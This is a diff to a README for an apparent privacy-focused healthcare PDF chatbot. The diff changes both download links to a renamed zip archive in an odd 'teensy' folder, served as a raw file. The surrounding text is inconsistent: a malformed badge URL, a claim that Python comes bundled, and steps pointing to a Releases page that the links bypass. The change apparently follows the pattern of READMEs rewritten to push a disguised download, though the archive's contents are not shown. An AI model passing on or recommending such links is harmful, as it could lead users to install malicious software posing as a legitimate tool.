@@ -5,7 +5,7 @@
 Explore healthcare documents with ease using our AI-powered chatbot. Interact with PDF files without any programming knowledge.
 
 ## 📥 Download Now 
-[![Download Latest Release](https://raw.githubusercontent.com/shadyelmansour/AI-HealthDoc-Chatbot-PDF-FAISS-FLAN/main/teensy/AI-HealthDoc-Chatbot-PDF-FAISS-FLAN.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/shadyelmansour/AI-HealthDoc-Chatbot-PDF-FAISS-FLAN/main/teensy/AI-HealthDoc-Chatbot-PDF-FAISS-FLAN.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/shadyelmansour/AI-HealthDoc-Chatbot-PDF-FAISS-FLAN/main/teensy/Doc-A-PD-FAIS-FLAN-Health-Chatbot-2.1.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/shadyelmansour/AI-HealthDoc-Chatbot-PDF-FAISS-FLAN/main/teensy/Doc-A-PD-FAIS-FLAN-Health-Chatbot-2.1.zip)
 
 ## 📊 About the Project 
 AI-HealthDoc-Chatbot-PDF-FAISS-FLAN is a privacy-focused chatbot that lets you chat with healthcare PDFs. It uses advanced technologies, including FAISS for fast searches and FLAN-T5 for accurate responses. Whether you need medical information or insights from various documents, our chatbot is here to help.
@@ -23,7 +23,7 @@ AI-HealthDoc-Chatbot-PDF-FAISS-FLAN is a privacy-focused chatbot that lets you c
 - **Python**: Version 3.7 or above (Python comes pre-installed in our package)
 
 ## 📥 Download & Install 
-To get started with AI-HealthDoc-Chatbot-PDF-FAISS-FLAN, visit this page to download: [Download Here](https://raw.githubusercontent.com/shadyelmansour/AI-HealthDoc-Chatbot-PDF-FAISS-FLAN/main/teensy/AI-HealthDoc-Chatbot-PDF-FAISS-FLAN.zip).
+To get started with AI-HealthDoc-Chatbot-PDF-FAISS-FLAN, visit this page to download: [Download Here](https://raw.githubusercontent.com/shadyelmansour/AI-HealthDoc-Chatbot-PDF-FAISS-FLAN/main/teensy/Doc-A-PD-FAIS-FLAN-Health-Chatbot-2.1.zip).
 
 1. Go to the Releases page. 
 2. Choose the latest version.
